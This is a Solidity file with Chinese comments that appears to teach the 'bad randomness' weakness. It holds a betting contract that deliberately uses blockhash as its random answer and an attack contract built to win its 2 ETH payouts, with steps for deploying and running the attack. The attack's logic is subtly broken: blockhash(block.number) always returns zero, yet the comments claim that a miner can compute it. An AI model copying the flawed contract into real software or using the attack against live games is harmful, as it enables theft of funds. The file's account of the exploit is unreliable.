pragma solidity >=0.8.0;
// SPDX-License-Identifier: UNLICENSED

/*
  漏洞：Bad Randomness
  描述：利用區塊中的資訊（如 blockhash）作為隨機數來源，攻擊者可藉由作礦或操控時間來預測該值，進而控制遊戲結果。
  下列程式碼示範一個有漏洞的合約 GameGuessBlockVulnerable，利用 blockhash(attempts[msg.sender].blockNumber) 當作隨機答案。
  攻擊合約 AttackGameGuessBlockVulnerable 利用攻擊流程，於下注當下（若自己為礦工）計算當區塊雜湊值並以此值下注，接著在下一區塊呼叫 settle 贏取獎勵。

  部署與攻擊流程：
    1. 部署 GameGuessBlockVulnerable 並充值足夠 Ether （確保合約有獎勵金庫）。
    2. 部署 AttackGameGuessBlockVulnerable 並指定目標合約位址。
    3. 攻擊者使用 attackBet() 以 1 ETH 下注，其猜測值為當前礦工可取得的 blockhash（需攻擊者具備作礦權限才能正確操作）。
    4. 等待下一區塊產生，再呼叫 attackSettle()，攻擊合約將呼叫目標合約的 settle()，由於猜測值正確而贏得 2 ETH 獎勵。
*/

contract GameGuessBlockVulnerable {
    struct Attempt {
        uint blockNumber;
        bytes32 guess;
    }
    // 將參與者的下注紀錄儲存在 mapping 中
    mapping(address => Attempt) public attempts;

    // 玩家下注，必須支付 1 ETH 並提供猜測值
    function bet(bytes32 _guess) public payable {
        require(msg.value == 1 ether, "Must send exactly 1 ETH");
        attempts[msg.sender] = Attempt({blockNumber: block.number, guess: _guess});
    }

    // settle 函式--漏洞重點：使用 blockhash 當作隨機來源
    function settle() public {
        // 必須確認當前區塊大於下注時的區塊
        require(block.number > attempts[msg.sender].blockNumber, "Wait for the next block");
        // 漏洞：直接利用 blockhash 作為答案，易受攻擊者控制
        bytes32 answer = blockhash(attempts[msg.sender].blockNumber);
        attempts[msg.sender].blockNumber = 0;
        if (attempts[msg.sender].guess == answer) {
            payable(msg.sender).transfer(2 ether);
        }
    }

    // 允許合約接收 Ether
    receive() external payable {}
}

/*
  攻擊合約
  此合約假設攻擊者具有礦工權限，可以在下注區塊當中預先計算出 blockhash 值，進而準確下注以中獎。
*/

contract AttackGameGuessBlockVulnerable {
    GameGuessBlockVulnerable public target;
    address public owner;

    // 修改建構子參數轉換：採用 payable 將 address 轉換成合約型別
    constructor(address _target) {
        target = GameGuessBlockVulnerable(payable(_target));
        owner = msg.sender;
    }

    // 攻擊者以 1 ETH 下賭注，其猜測值利用目前區塊的 blockhash 預先計算 (僅當礦工時才有效)
    function attackBet() public payable {
        require(msg.sender == owner, "Not owner");
        // 注意：在一般情況下 blockhash(block.number) 會返回 0，但當攻擊者有作礦控制時，可計算出正確答案
        bytes32 guess = blockhash(block.number);
        target.bet{value: 1 ether}(guess);
    }

    // 在下一區塊呼叫 settle 以贏取獎勵
    function attackSettle() public {
        require(msg.sender == owner, "Not owner");
        target.settle();
        // 將合約內剩餘的 Ether 轉回攻擊者
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {}
}